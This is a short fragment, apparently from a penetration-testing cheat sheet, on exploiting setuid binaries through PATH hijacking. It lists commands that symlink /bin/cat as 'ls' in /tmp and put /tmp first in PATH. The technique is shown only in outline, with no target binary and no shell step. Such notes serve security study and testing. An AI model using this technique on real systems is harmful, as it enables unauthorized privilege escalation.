# Setuid

In this section we will look at ways to exploit a setuid

## Enviornment Variable Path

* In writeable directory /tmp or /tmp/var make a symbolic link to binary
`$ cd /tmp`
`/tmp:~>ln -s /bin/cat ls`
`export PATH=/tmp/:$PATH`
